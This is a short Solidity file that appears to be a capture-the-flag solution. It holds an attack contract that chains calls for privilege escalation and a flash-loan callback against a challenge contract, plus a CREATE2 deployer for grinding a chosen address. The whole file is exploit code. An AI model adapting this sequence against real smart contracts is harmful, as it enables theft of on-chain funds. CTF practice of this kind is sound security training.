//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
import "./function.sol";
//依次调用func中的四个函数即可
contract fig{
    check public fun;
    constructor(address payable _fun){
        fun = check(_fun);
    } 
    function figure()public pure returns(bytes memory){
        return abi.encodeWithSignature("com()");
    }

    function attack()public{
        fun.pul();
        fun.ownerPrivalege();
        fun.ext();
        fun.flashLoan(address(fun),0,figure());
    }

    function complete()public{
        fun.isCompleted();
    }
}

contract deploy{
    fig public fi;
    address payable fun;
    bytes byteCode = type(fig).creationCode;
    bytes creatCode;
    constructor(address payable _fun){
        fun = _fun;
        creatCode = abi.encodePacked(type(fig).creationCode,abi.encode(fun));
    }
    function deployed(bytes32 salt)public{
        fi = new fig{salt : salt}(fun);
    }

    function getHash()public view returns(bytes32){
        return keccak256(creatCode);
    }
}